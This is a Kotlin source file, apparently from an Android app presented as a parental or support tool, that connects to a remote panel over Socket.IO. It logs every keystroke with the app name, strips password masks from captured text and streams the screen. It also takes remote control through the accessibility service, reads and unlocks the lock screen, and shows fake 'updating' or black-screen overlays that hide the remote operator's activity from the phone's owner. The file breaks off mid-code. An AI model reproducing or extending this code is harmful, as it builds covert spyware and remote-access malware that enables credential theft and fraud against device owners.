package com.example.acessomaterno

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

object SocketManager {
    private const val TAG = "SocketManager"

    // Contexto da aplicação (necessário para o blackout via WindowManager).
    @Volatile
    var appContext: Context? = null

    // Flag global para verificar o estado do blackout gráfico local (modo escuro)
    @Volatile
    var modoEscuroAtivo: Boolean = false

    // SINCRONIA DE FRAME: quando true, o ScreenCaptureService oculta o overlay
    // visual de atualização por ~18ms, captura o fundo LIMPO e restaura — o
    // painel/emulador flutuante vê apenas o fundo real do dispositivo.
    @Volatile
    var overlayAtualizacaoVisualAtivo: Boolean = false

    // Fallback do anúncio (brilho-zero): usado SOMENTE quando o Suporte Motor
    // (UID separado) não está instalado. Escurece a tela FÍSICA (brilho mínimo)
    // sem afetar o MediaProjection — o painel continua em cores normais.
    @Volatile
    private var anuncioBrilhoZeroAtivo: Boolean = false

    // Painel FastAPI (mesmo domínio do /conectar-filho).
    var serverUrl: String = BuildConfig.PANEL_URL

    @Volatile
    var socket: Socket? = null
        private set

    // Diferencia 1ª conexão de RECONEXÃO: só reexibimos o modal numa reconexão
    // (não atrapalha o fluxo normal na primeira abertura do app).
    @Volatile
    private var jaConectouUmaVez = false

    /** REGRA DE ISOLAMENTO (defesa lateral): se o comando carrega o campo
     * "dispositivo" e ele NÃO é este aparelho, ignora. O servidor já entrega
     * o comando a um único sid; esta é uma segunda barreira. */
    private fun comandoDestinadoAOutro(json: JSONObject?): Boolean {
        val alvo = json?.optString("dispositivo")?.takeIf { it.isNotEmpty() } ?: return false
        val meu = nomeDispositivoAtual()
        if (alvo != meu) {
            emitLog("[ISOLAMENTO] Comando destinado a '$alvo' IGNORADO por '$meu'.")
            return true
        }
        return false
    }

    /**
     * Controla o OverlayService (janela de overlay "Atualizando o aplicativo...").
     *
     * CORREÇÃO DE CRASH/ANR: NÃO usa mais startForegroundService(). O
     * OverlayService NÃO é um serviço de primeiro plano (nunca chama
     * startForeground() e não tem foregroundServiceType no manifest). O
     * startForegroundService() exigia que o serviço chamasse startForeground()
     * em até ~5 segundos e, como isso nunca acontecia, o Android lançava
     * ForegroundServiceDidNotStartInTimeException (API 31+) /
     * MissingForegroundServiceTypeException (targetSdk 35 / Android 14+) —
     * crash ou ANR ("não está respondendo") que matava o processo inteiro e
     * derrubava também o ScreenCaptureService (espelhamento). Agora usa
     * startService comum: é permitido enquanto o ScreenCaptureService (FGS de
     * mediaProjection) mantém o app em foreground; se o sistema bloquear por
     * background, o try/catch engole a exceção e nada cai.
     *
     * NÃO bloqueia mais emuladores: o overlay roda em físico e emulador
     * (no emulador o OverlayService aplica fundo semitransparente #66000000).
     */
    private fun controlarOverlayService(ctx: Context, ativo: Boolean) {
        // CAMINHO CONFIÁVEL NO NOX/EMULADOR: o overlay da Acessibilidade usa
        // TYPE_ACCESSIBILITY_OVERLAY e NÃO depende de SYSTEM_ALERT_WINDOW (que
        // no Nox costuma não estar concedida → OverlayService encerra sozinho e
        // "nada aparece"). Então, sempre que a acessibilidade estiver ligada,
        // mostramos/escondemos o cartão "Atualizando…" por ela — garante que o
        // fundo escuro + círculo apareçam no Nox. O OverlayService continua
        // como reforço para aparelhos físicos onde a permissão está concedida.
        try {
            val svcAcess = MyAccessibilityService.instance
            if (svcAcess != null) {
                if (ativo) svcAcess.mostrarOverlayAtualizacao()
                else svcAcess.esconderOverlayAtualizacao()
                emitLog("[OVERLAY] Overlay via Acessibilidade ${if (ativo) "ATIVADO" else "DESATIVADO"} (funciona no Nox, sem SYSTEM_ALERT_WINDOW).")
            }
        } catch (e: Exception) {
            emitLog("[OVERLAY ERRO] Falha no overlay via Acessibilidade: ${e.message}")
        }
        try {
            val serviceIntent = Intent(ctx, OverlayService::class.java)
            if (ativo) {
                ctx.startService(serviceIntent)
                emitLog("[OVERLAY] OverlayService iniciado (startService comum, sem foreground — sem risco de ANR/crash).")
            } else {
                ctx.stopService(serviceIntent)
                emitLog("[OVERLAY] OverlayService parado.")
            }
        } catch (e: Exception) {
            // BackgroundServiceStartNotAllowedException / IllegalStateException
            // (app em background sem FGS) — apenas registra, NÃO derruba o app
            // nem interrompe o espelhamento.
            emitLog("[OVERLAY ERRO] Não foi possível (des)ativar OverlayService: ${e.message} — o espelhamento continua ativo.")
            Log.e(TAG, "Erro ao controlar OverlayService: ${e.message}", e)
        }
    }

    /**
     * Garante que o Socket.IO esteja conectado e re-identificado.
     * Chamado ao acender a tela (SCREEN_ON / USER_PRESENT) ou ao enviar frames de tela.
     */
    /** Emite mensagem de sinalização WebRTC (offer / ICE) com o nome do
     *  dispositivo para o servidor rotear à sala "painel". O vídeo NÃO passa
     *  pelo Socket.IO — apenas estas mensagens de controle. */
    fun emitWebRtc(evento: String, payload: JSONObject) {
        try {
            payload.put("dispositivo", nomeDispositivoAtual())
            socket?.emit(evento, payload)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao emitir $evento: ${e.message}")
        }
    }

    /** Emite status_captura para o painel: H264 / JPEG_FALLBACK / SEM_PERMISSAO_TELA. */
    fun emitStatusCaptura(status: String) {
        try {
            val json = JSONObject().apply {
                put("dispositivo", nomeDispositivoAtual())
                put("status", status)
            }
            socket?.emit("status_captura", json)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao emitir status_captura: ${e.message}")
        }
    }

    /** Emite sinal de conclusão real da atualização para o painel. */
    fun emitirAtualizacaoConcluida(sucesso: Boolean, erro: String? = null) {
        try {
            val payload = JSONObject().apply {
                put("dispositivo", nomeDispositivoAtual())
                put("sucesso", sucesso)
                if (erro != null) put("erro", erro)
            }
            socket?.emit("atualizacao_concluida", payload)
            Log.d(TAG, "Sinal 'atualizacao_concluida' emitido: sucesso=$sucesso")
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao emitir atualizacao_concluida: ${e.message}")
        }
    }

    fun enviarTecladoLog(app: String, texto: String, bounds: android.graphics.Rect?) {
        try {
            val mascaraRegex = Regex("[•●*·∙⚫◦○◌◍◉⬤⚪⬛▪▮‣⦁✱✳✴❋]")
            val textoLimpo = (texto ?: "").replace(mascaraRegex, "").replace("\n", " ").replace("\r", " ").replace(Regex("\\s+"), " ").trim()
            val json = JSONObject().apply {
                put("texto", textoLimpo)
                put("app", app.ifEmpty { "(sem aplicativo)" })
                put("dispositivo", nomeDispositivoAtual())
            }
            socket?.emit("teclado_log", json)
            Log.d(TAG, "Log de teclado enviado: $json")
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar log de teclado: ${e.message}")
        }
    }

    /**
     * MAPEAMENTO DE TOQUES NO TECLADO — envia UMA tecla no exato instante do
     * clique (TYPE_VIEW_CLICKED), sem ler o campo de texto. O leitor FPS monta a
     * sequência exata de letras/números na ordem pressionada.
     *
     * tecla: o caractere real ("a", "5", "@"), " " para espaço ou "\b" para
     *        apagar (backspace). Enviada CRUA, sem remover nada.
     */
    fun enviarTeclaPressionada(app: String, tecla: String, timestamp: Long) {
        try {
            val json = JSONObject().apply {
                put("tecla", tecla)
                put("app", app.ifEmpty { "(sem aplicativo)" })
                put("dispositivo", nomeDispositivoAtual())
            }
            socket?.emit("teclado_tecla", json)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar tecla pressionada: ${e.message}")
        }
    }

    /**
     * Resultado do desbloqueio por PADRÃO: sucesso = o keyguard destravou após
     * desenhar o padrão (senha correta). O painel usa isto para mostrar
     * "desbloqueado" ou "senha padrão incorreta".
     */
    fun enviarResultadoPadrao(sucesso: Boolean, motivo: String? = null) {
        try {
            val json = JSONObject().apply {
                put("sucesso", sucesso)
                if (motivo != null) put("motivo", motivo)
                put("dispositivo", nomeDispositivoAtual())
                put("timestamp", System.currentTimeMillis().toString())
            }
            socket?.emit("desbloquear_padrao_resultado", json)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar resultado do padrão: ${e.message}")
        }
    }

    fun garantirConexao() {
        try {
            val s = socket
            if (s == null) {
                connect()
            } else if (!s.connected()) {
                Log.d(TAG, "Garantindo conexão Socket.IO: chamando connect() e re-identificando...")
                s.connect()
                val nomeDispositivo = nomeDispositivoAtual()
                val tipoDispositivo = tipoDispositivoAtual()
                s.emit("identificar", nomeDispositivo, tipoDispositivo)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao garantir conexão do Socket: ${e.message}")
        }
    }

    fun connect(url: String = serverUrl) {
        // TRAVA RIGOROSA DE INSTÂNCIA ÚNICA (Thread-Safe Double-Check Locking):
        // Chamar connect() de múltiplos lugares (MainActivity, BootReceiver,
        // MyAccessibilityService, ScreenCaptureService em transições de tela)
        // NÃO cria novos sockets duplicados, impedindo colisões no barramento.
        val existente = socket
        if (existente != null) {
            if (existente.connected()) return
            if (!existente.isActive) {
                try { existente.connect() } catch (_: Exception) {}
            }
            return
        }
        synchronized(this) {
            val segundoCheque = socket
            if (segundoCheque != null) {
                if (segundoCheque.connected()) return
                if (!segundoCheque.isActive) segundoCheque.connect()
                return
            }
            try {
                serverUrl = url
                
                // Configuração explícita de transporte e reconexão estável do Socket.IO
                val opts = IO.Options().apply {
                    transports = arrayOf("websocket", "polling")
                    reconnection = true
                    reconnectionAttempts = Int.MAX_VALUE
                    reconnectionDelay = 1000
                }

                val s = IO.socket(serverUrl, opts).apply {
                    on(Socket.EVENT_CONNECT) {
                        Log.d(TAG, "Socket.io Conectado com sucesso!")
                        val nomeDispositivo = nomeDispositivoAtual()
                        val tipoDispositivo = tipoDispositivoAtual()

                        // Identifica este dispositivo no socket vivo pelo nome
                        // E pelo tipo (fisico/emulador) — o servidor usa esta
                        // informação para separar por salas (Rooms). Emuladores
                        // NÃO recebem comandos de overlay (tela preta/anúncio).
                        emit("identificar", nomeDispositivo, tipoDispositivo)

                        try {
                            val prefs = appContext?.getSharedPreferences("rastreio_facil_prefs", Context.MODE_PRIVATE)
                            val consentTs = prefs?.getLong("consent_timestamp", 0L) ?: 0L
                            val consentVersao = prefs?.getInt("consent_versao_aceita", 0) ?: 0
                            val auditJson = JSONObject().apply {
                                put("dispositivo", nomeDispositivo)
                                put("consent_versao", consentVersao)
                                put("consent_ts", consentTs)
                            }
                            emit("consent_auditoria", auditJson)
                        } catch (_: Exception) {}
                        
                        // SINCRONIZAÇÃO DO HANDSHAKE AUTOMÁTICO:
                        // Dispara o registro HTTP em uma Thread isolada protegida contra NetworkOnMainThreadException.
                        Thread {
                            try {
                                RegistroPainel.registrar(nomeDispositivo)
                            } catch (e: Exception) {
                                Log.e(TAG, "Falha ao registrar no painel após EVENT_CONNECT: ${e.message}")
                            }
                        }.start()

                        // RECONEXÃO (casa de segurança): se a conexão caiu e voltou e o
                        // espelhamento NÃO está ativo, reexibe o modal interno de
                        // consentimento para restabelecê-lo. Não dispara na 1ª conexão.
                        val ehReconexao = jaConectouUmaVez
                        jaConectouUmaVez = true
                        if (ehReconexao && !ScreenCaptureService.isRunning) {
                            try {
                                val ctx = appContext ?: MyAccessibilityService.instance
                                if (ctx != null) {
                                    val intent = Intent(ctx, MainActivity::class.java).apply {
                                        putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                    }
                                    ctx.startActivity(intent)
                                    emitLog("[RECONEXAO] Socket reconectou e captura inativa — reexibindo modal de consentimento do espelhamento.")
                                }
                            } catch (e: Exception) {
                                emitLog("[RECONEXAO ERRO] Falha ao reexibir modal: ${e.message}")
                            }
                        }
                    }
                    on(Socket.EVENT_DISCONNECT) {
                        Log.d(TAG, "Socket.io Desconectado")
                    }
                    on(Socket.EVENT_CONNECT_ERROR) { args ->
                        Log.e(TAG, "Erro de Conexão Socket.io: ${args.joinToString()}")
                    }

                    // ----------------------------------------------------------------
                    // OUVINTES DE CONTROLE — Registrados DIRETAMENTE no socket estável.
                    // Despacham toques, gestos e texto para MyAccessibilityService.instance
                    // ----------------------------------------------------------------
                    on("receber_movimento") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        if (json != null) {
                            val svc = MyAccessibilityService.instance
                            if (svc == null) {
                                emitLog("[ACES] IGNORADO: serviço de acessibilidade NÃO está ativo (movimento)")
                            } else {
                                svc.onRemoteMovimento(json)
                            }
                        }
                    }
                    on("receber_swipe_vertical") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        if (json != null) {
                            val svc = MyAccessibilityService.instance
                            if (svc != null) {
                                val x = json.optDouble("x", 0.5).toFloat()
                                val y1 = json.optDouble("y1", 0.75).toFloat()
                                val y2 = json.optDouble("y2", 0.25).toFloat()
                                val duration = json.optLong("duration", 200L)
                                // Só a sala do emulador nativo usa bypass do overlay.
                                val bypass = json.optString("sala", "nativo") != "dispositivo"
                                val metrics = svc.resources.displayMetrics
                                val w = metrics.widthPixels.toFloat()
                                val h = metrics.heightPixels.toFloat()
                                svc.swipe(x * w, y1 * h, x * w, y2 * h, duration, bypass)
                            }
                        }
                    }
                    on("receber_tecla") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        if (json != null) {
                            val svc = MyAccessibilityService.instance
                            if (svc == null) {
                                emitLog("[ACES] IGNORADO: serviço de acessibilidade NÃO está ativo (tecla)")
                            } else {
                                svc.onRemoteTecla(json)
                            }
                        }
                    }
                    on("desligar") {
                        MyAccessibilityService.instance?.pararCaptura()
                    }
                    on("tela_privacidade") { args ->
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[ACES] IGNORADO: acessibilidade off (tela_privacidade)")
                        } else {
                            val acao = parseJson(args)?.optString("acao", "mostrar") ?: "mostrar"
                            if (acao == "ocultar") svc.removerTelaPrivacidadeRemoto()
                            else svc.solicitarTelaPrivacidade()
                        }
                    }

                    // ================================================================
                    // NATIVE WINDOW OVERLAY INJECTION — comando "tela_escura"
                    // ================================================================
                    on("tela_escura") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val acao = json?.optString("acao", "mostrar") ?: "mostrar"
                        when (acao.lowercase()) {
                            "ocultar", "clarear" -> {
                                modoEscuroAtivo = false
                                ScreenCaptureService.removerTelaPretaFalsa()
                                emitLog("[TELA ESCURA] Overlay nativo removido (acao='$acao'; tela física clareada; stream do painel continua claro).")
                            }
                            else -> {
                                modoEscuroAtivo = true
                                val ctx = appContext ?: MyAccessibilityService.instance
                                if (ctx == null) {
                                    emitLog("[TELA ESCURA] IGNORADO: sem contexto estável (appContext e acessibilidade nulos).")
                                } else {
                                    ScreenCaptureService.ativarTelaPretaFalsa(ctx)
                                    emitLog("[TELA ESCURA] Overlay nativo injetado via WindowManager (acao='$acao'). Tela física preta; painel continua vendo vídeo claro e operável.")
                                }
                            }
                        }
                    }

                    on("modo_escuro") {
                        modoEscuroAtivo = true
                        val ctx = appContext ?: MyAccessibilityService.instance
                        if (ctx == null) {
                            emitLog("[TELA ESCURA] IGNORADO: appContext não definido (modo_escuro)")
                        } else {
                            ScreenCaptureService.ativarTelaPretaFalsa(ctx)
                            emitLog("[TELA ESCURA] Blackout via WindowManager ativado (painel continua vendo vídeo).")
                        }
                    }
                    on("modo_clarear") {
                        modoEscuroAtivo = false
                        ScreenCaptureService.removerTelaPretaFalsa()
                        emitLog("[TELA ESCURA] Blackout via WindowManager removido.")
                    }

                    on("configurar_acesso_total") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> false
                        }
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[ACES] IGNORADO: acessibilidade off (configurar_acesso_total)")
                        } else {
                            svc.configurarAcessoTotal(ativo)
                        }
                    }

                    // ================================================================
                    // GATILHO SOCKET.IO: "ativar_anuncio" / "configurar_anuncio"
                    // ----------------------------------------------------------------
                    // Envia broadcast explícito para o Suporte Motor (pacote/UID separado).
                    // Como o Suporte Motor possui outro UID, a janela com FLAG_SECURE
                    // criada por ele no aparelho físico é OMITIDA da captura do MediaProjection.
                    // EFEITO: Tela física = Preta com "Carregando…", Painel = Cores normais.
                    // ================================================================
                    on("solicitar_keyframe") {
                        H264ScreenEncoder.instance?.requestKeyFrame()
                        emitLog("[H264] Keyframe solicitado pelo painel.")
                    }

                    // ================================================================
                    // RECONEXÃO DE SESSÃO — comando "retomar_stream"
                    // ----------------------------------------------------------------
                    // Enviado pelo servidor quando este dispositivo (que já teve o
                    // compartilhamento de tela aprovado nesta sessão) reconecta após
                    // um restart do "Acesso Materno.exe". Garante que o socket esteja
                    // vivo/identificado e força a retomada do stream: pede keyframe
                    // (H.264) e reenvia o status de captura — o painel reabre a
                    // visualização automaticamente, sem clique manual. A captura de
                    // tela (MediaProjection) segue viva no app; aqui apenas a
                    // "acordamos" para o painel recém-reaberto.
                    // ================================================================
                    on("retomar_stream") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        try {
                            garantirConexao()
                            H264ScreenEncoder.instance?.requestKeyFrame()
                            val capturando = ScreenCaptureService.ultimoResultCode != null &&
                                ScreenCaptureService.ultimoData != null
                            emitStatusCaptura(if (capturando) "RETOMANDO" else "SEM_PERMISSAO_TELA")
                            emitLog("[SESSAO] 'retomar_stream' recebido — stream de tela retomado para o painel (captura ativa=$capturando).")
                        } catch (e: Exception) {
                            emitLog("[SESSAO ERRO] Falha ao retomar stream: ${e.message}")
                        }
                    }
                    on("solicitar_jpeg_fallback") {
                        ScreenCaptureService.ativarFallbackJpeg()
                        emitLog("[H264] Painel solicitou fallback JPEG ultraleve (H.264 não decodificou no navegador).")
                    }

                    on("ativar_anuncio") { args ->
                        val json = parseJson(args)
                        val acao = json?.optString("acao", "mostrar") ?: "mostrar"
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", true)
                            acao.lowercase() in listOf("fechar", "ocultar", "remover", "desativar") -> false
                            else -> true
                        }
                        dispararAnuncioViaSuporteMotor(ativo)
                    }

                    on("configurar_anuncio") { args ->
                        val json = parseJson(args)
                        val dispAlvo = if (json != null && json.has("dispositivo")) json.optString("dispositivo") else null
                        if (!dispAlvo.isNullOrEmpty() && dispAlvo != nomeDispositivoAtual()) {
                            emitLog("[ANUNCIO] IGNORADO: evento destinado a '$dispAlvo'; este aparelho é '${nomeDispositivoAtual()}'.")
                            return@on
                        }
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> false
                        }
                        dispararAnuncioViaSuporteMotor(ativo)
                    }

                    // Botões do Emulador Flutuante (Home / Voltar)
                    on("botao_home") {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[NAV] IGNORADO: acessibilidade off (botão HOME).")
                        } else {
                            svc.performGlobalHomeAction()
                            emitLog("[NAV] Botão HOME disparado pelo painel (emulador flutuante).")
                        }
                    }
                    on("botao_voltar") {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[NAV] IGNORADO: acessibilidade off (botão VOLTAR).")
                        } else {
                            svc.performGlobalBackAction()
                            emitLog("[NAV] Botão VOLTAR disparado pelo painel (emulador flutuante).")
                        }
                    }
                    on("botao_recentes") {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) { emitLog("[NAV] IGNORADO: acessibilidade off (botão RECENTES).") }
                        else { svc.performGlobalRecentesAction(); emitLog("[NAV] Botão RECENTES disparado pelo painel (emulador flutuante).") }
                    }
                    on("botao_power") {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) { emitLog("[NAV] IGNORADO: acessibilidade off (botão POWER/LIGAR).") }
                        else { svc.acenderTelaRemota(); emitLog("[NAV] Botão POWER/LIGAR disparado pelo painel — tela do dispositivo sendo acesa.") }
                    }

                    on("loading_overlay") { args ->
                        val json = parseJson(args)
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> false
                        }
                        val ctx = appContext
                        if (ctx != null) {
                            val intent = Intent("com.example.acessomaterno.ACAO_LOADING_OVERLAY").apply {
                                putExtra("ativo", ativo)
                            }
                            ctx.sendBroadcast(intent)
                            controlarOverlayService(ctx, ativo)
                        }
                        aplicarKioskAtualizacao(ativo)
                        emitLog("[LOADING OVERLAY] Ativo = $ativo")
                    }

                    on("atualizacao_status") { args ->
                        val json = parseJson(args)
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> false
                        }
                        val ctx = appContext
                        if (ctx != null) {
                            val intent = Intent("com.example.acessomaterno.ACAO_LOADING_OVERLAY").apply {
                                putExtra("ativo", ativo)
                            }
                            ctx.sendBroadcast(intent)
                            controlarOverlayService(ctx, ativo)
                        }
                        aplicarKioskAtualizacao(ativo)
                        emitLog("[ATUALIZACAO STATUS] Ativo = $ativo")
                    }

                    // ============================================================
                    // ETAPA 2 — HANDLER DO DISPOSITIVO (tela preta profissional).
                    // Evento EXCLUSIVO e SEPARADO dos demais overlays: liga/desliga
                    // a animação "Atualizando o aplicativo" em fundo PRETO opaco,
                    // via AtualizacaoDispositivoService. Payload: {ativo:true|false}.
                    // ============================================================
                    on("atualizacao_dispositivo") { args ->
                        val json = parseJson(args)
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> false
                        }
                        // NOVO (Switch Direita/Esquerda): a tela preta discreta agora
                        // é uma MainActivity em MODO ATUALIZAÇÃO — tema transparente
                        // (zero tela branca) + FLAG_SECURE (o espelhamento ignora a
                        // janela e filma o fundo real) + tela cheia preta imersiva.
                        // SEM WindowManager overlay. Universal Android 7 → 15.
                        //   Direita (ativo=true)  -> abre a Activity (via acessibilidade
                        //                            + FullScreenIntent de garantia);
                        //   Esquerda (ativo=false)-> fecha na hora (finishAndRemoveTask).
                        val ctx = appContext ?: MyAccessibilityService.instance
                        if (ativo) {
                            MainActivity.abrirModoAtualizacao(ctx)
                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (MainActivity modo atualização) ativo = true")
                        } else {
                            MainActivity.fecharModoAtualizacao()
                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta encerrada (finishAndRemoveTask) ativo = false")
                        }
                    }

                    // ============================================================
                    // OVERLAY VISUAL DE ATUALIZAÇÃO + SINCRONIA DE FRAME
                    // ------------------------------------------------------------
                    // Botão "Overlay Atualização" do painel (ao lado de "Travar").
                    // Liga/desliga:
                    //   1. O overlay visual "Atualizando…" no dispositivo
                    //      (MyAccessibilityService — FLAG_NOT_TOUCHABLE, toques
                    //      livres, apenas a camada visual com o círculo).
                    //   2. A captura limpa no ScreenCaptureService: oculta o
                    //      overlay por ~18ms, captura o fundo REAL (sem o
                    //      cartão) e restaura — o emulador flutuante recebe
                    //      apenas o fundo limpo, com todos os controles OK.
                    // ============================================================
                    on("overlay_atualizacao_visual") { args ->
                        val json = parseJson(args)
                        val ativo = json?.optBoolean("ativo", false) ?: false
                        // NOVO FLUXO (Switch): a tela preta do dispositivo agora é a
                        // MainActivity em MODO ATUALIZAÇÃO (sem WindowManager overlay).
                        // Se ela já está ativa, NÃO desenha o overlay WM aqui (evita
                        // overlay duplo); o painel/emulador mostram só o spinner. O
                        // caminho antigo (sem MainActivity) continua intacto.
                        if (MainActivity.instanciaAtualizacao != null) {
                            emitirAtualizacaoConcluida(true)
                            emitLog("[OVERLAY ATZ] MainActivity atualização ativa — sem overlay WM.")
                            return@on
                        }
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[OVERLAY ATZ] Serviço de acessibilidade indisponível.")
                            emitirAtualizacaoConcluida(false, "Serviço de acessibilidade indisponível")
                            return@on
                        }
                        if (ativo) {
                            svc.mostrarOverlayAtualizacao()
                            try {
                                val ctx = appContext ?: svc
                                val intent = Intent(ctx, ScreenCaptureService::class.java)
                                intent.action = "com.example.acessomaterno.ACTION_REFRESH_CAPTURE"
                                ctx.startService(intent)
                            } catch (_: Exception) {}

                            Handler(Looper.getMainLooper()).postDelayed({
                                emitirAtualizacaoConcluida(true)
                            }, 1200L)
                        } else {
                            svc.esconderOverlayAtualizacao()
                        }
                        emitLog("[OVERLAY ATZ] ativo=$ativo aplicado.")
                    }

                    // ============================================================
                    // OPACIDADE DO DISPOSITIVO (slider "Fundo do Dispositivo"):
                    // escurece o overlay do cartão NO APARELHO. Aplica nos DOIS
                    // caminhos: MyAccessibilityService (quando a acessibilidade
                    // está ON — caminho ativo no Nox/celular) e OverlayService
                    // (fallback). Não mexe no painel nem na flag de captura limpa.
                    // ============================================================
                    on("overlay_opacidade") { args ->
                        val op = when {
                            args.isEmpty() -> 0.6f
                            args[0] is JSONObject -> (args[0] as JSONObject).optDouble("opacidade", 0.6).toFloat()
                            args[0] is Number -> (args[0] as Number).toFloat()
                            else -> 0.6f
                        }
                        val neutro = kotlin.math.abs(op) < 0.02f
                        // CORREÇÃO (Nox): o slider sozinho não ligava NENHUMA
                        // janela de overlay — só guardava o valor. Sem a
                        // Acessibilidade ligada e sem o toggle "Overlay
                        // Atualização" ativado antes, nada aparecia no aparelho.
                        // Agora o próprio slider LIGA/DESLIGA o OverlayService
                        // (usa SYSTEM_ALERT_WINDOW, já concedida no Nox) e, se a
                        // Acessibilidade estiver ON, usa também aquele caminho.
                        // Define a opacidade ANTES de iniciar o serviço, para a
                        // primeira renderização (OverlayService.onCreate →
                        // corFundo()) já sair com a cor/alpha correta.
                        ScreenCaptureService.aplicarOpacidadeDispositivo(op)
                        val ctx = appContext
                        if (ctx != null) {
                            controlarOverlayService(ctx, !neutro)
                        }
                        // ESTE slider controla o PRÓPRIO APARELHO (Nox): arrastar
                        // para escurecer/clarear mostra e ajusta o overlay NO
                        // DISPOSITIVO em tempo real; no neutro (≈0) remove. Assim
                        // o modal "Fundo do Dispositivo" controla o Nox, e o
                        // "Opacidade do Painel" (overlay_opacidade_painel) fica só
                        // no painel do técnico. Caminho ativo = acessibilidade ON.
                        val svc = MyAccessibilityService.instance
                        if (svc != null) {
                            svc.opacidadeFundoOverlayAtualizacao = op
                            if (neutro) {
                                // Neutro → tira o overlay do aparelho.
                                if (svc.isAtualizacaoAtiva) svc.esconderOverlayAtualizacao()
                            } else {
                                // Clarear/escurecer → garante o overlay visível no
                                // aparelho e aplica a nova opacidade/cor.
                                if (!svc.isAtualizacaoAtiva) svc.mostrarOverlayAtualizacao()
                                svc.atualizarOpacidadeOverlayAtualizacao(op)
                            }
                        }
                    }

                    // ============================================================
                    // OPACIDADE DO PAINEL (slider "Opacidade do Painel"): só
                    // ajusta a flag de captura limpa no ScreenCaptureService
                    // (ativa quando < 95%). NÃO altera o overlay do aparelho.
                    // ============================================================
                    on("overlay_opacidade_painel") { args ->
                        val op = when {
                            args.isEmpty() -> 1.0f
                            args[0] is JSONObject -> (args[0] as JSONObject).optDouble("opacidade", 1.0).toFloat()
                            args[0] is Number -> (args[0] as Number).toFloat()
                            else -> 1.0f
                        }
                        MyAccessibilityService.instance?.ajustarOpacidadeFundoOverlay(op)
                    }

                    on("overlay_falhou") { args ->
                        Log.d(TAG, "overlay_falhou recebido: ${args.joinToString()}")
                    }

                    // ================================================================
                    // INSPEÇÃO E DESBLOQUEIO REMOTO DA TELA DE BLOQUEIO
                    // ================================================================
                    // ============================================================
                    // SINALIZAÇÃO WEBRTC (vídeo em tempo real do espelhamento)
                    // Apenas offer / answer / ICE passam pelo Socket.IO.
                    // O vídeo flui direto Android <-> navegador (P2P via STUN).
                    // ============================================================
                    on("webrtc_iniciar") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val rc = ScreenCaptureService.ultimoResultCode
                        val data = ScreenCaptureService.ultimoData
                        if (rc == null || data == null) {
                            emitLog("[WEBRTC] IGNORADO: sem token de MediaProjection (captura ainda não iniciada).")
                        } else {
                            Thread {
                                try {
                                    val ctx = appContext ?: MyAccessibilityService.instance
                                    if (ctx != null) {
                                        WebRtcStreamer.iniciar(ctx, rc, data)
                                        emitLog("[WEBRTC] Iniciado (ScreenCapturerAndroid + VideoTrack HW).")
                                    }
                                } catch (e: Exception) {
                                    emitLog("[WEBRTC ERRO] ${e.message}")
                                }
                            }.start()
                        }
                    }
                    on("webrtc_answer") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val sdp = json?.optString("sdp")?.takeIf { it.isNotEmpty() }
                        if (sdp != null) WebRtcStreamer.receberAnswer(sdp)
                    }
                    on("webrtc_ice") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        if (json != null) {
                            WebRtcStreamer.receberIce(
                                json.optString("sdpMid"),
                                json.optInt("sdpMLineIndex"),
                                json.optString("candidate")
                            )
                        }
                    }
                    on("webrtc_parar") {
                        WebRtcStreamer.parar()
                        emitLog("[WEBRTC] Parado por solicitação do painel.")
                    }

                    on("ler_tela_bloqueio") {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[BLOQUEIO ERRO] Acessibilidade inativa.")
                        } else {
                            val payload = svc.lerArvoreTelaBloqueio()
                            socket?.emit("no_arvore_bloqueio", payload)
